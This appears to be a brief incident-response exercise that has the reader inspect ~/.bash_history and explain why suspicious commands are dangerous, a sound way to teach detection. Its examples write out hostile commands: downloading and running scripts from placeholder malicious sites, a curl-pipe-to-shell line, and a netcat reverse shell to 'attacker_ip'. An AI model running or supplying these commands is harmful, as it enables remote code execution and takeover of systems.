Open the .bash_history file:


cat ~/.bash_history
Look for commands like:

wget http://malicious-site.com/malware.sh

nc -e /bin/sh attacker_ip 4444

curl http://bad-site.com/script.sh | sh

chmod +x malware.sh && ./malware.sh

Pick two suspicious commands and explain briefly:

Example:
Command 1: wget http://malicious-site.com/malware.sh
Why dangerous: Downloads potentially malicious scripts or files from an untrusted source.

Command 2: nc -e /bin/sh attacker_ip 4444
Why dangerous: Opens a reverse shell connection, giving remote attacker control over the system.
